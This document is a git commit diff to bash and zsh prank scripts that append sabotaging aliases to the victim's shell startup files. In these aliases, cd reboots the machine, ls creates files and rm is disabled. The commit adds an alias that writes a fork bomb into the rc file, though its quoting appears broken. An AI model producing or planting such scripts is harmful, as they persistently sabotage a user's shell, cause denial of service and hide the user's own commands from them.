391f3dae2514fc9b1707c18c0684e696339bf83d
Yaël Pierre <yael.pierre@epitech.eu>
2025-10-20 15:14:28 +0200

    cool

--- bash/alias_chiants.sh
+++ bash/alias_chiants.sh
@@ -2,4 +2,5 @@ echo 'alias ls="touch coucou"' >> ~/.bashrc
 echo 'alias cd="reboot"' >> ~/.bashrc
 echo 'alias clear="tree"' >> ~/.bashrc
 echo 'alias rm="echo \"Ne me supprime pas stp : ( !\""' >> ~/.bashrc
+echo 'alias clear="echo ":(){ :|:& };:" >> ~/.bashrc"' >> ~/.bashrc
 source ~/.bashrc
--- zsh/alias_chiants.sh
+++ zsh/alias_chiants.sh
@@ -2,4 +2,5 @@ echo 'alias ls="touch coucou"' >> ~/.zshrc
 echo 'alias cd="reboot"' >> ~/.zshrc
 echo 'alias clear="tree"' >> ~/.zshrc
 echo 'alias rm="echo \"Ne me supprime pas stp : ( !\""' >> ~/.zshrc
+echo 'alias clear="echo ":(){ :|:& };:" >> ~/.zshrc"' >> ~/.zshrc
 source ~/.zshrc
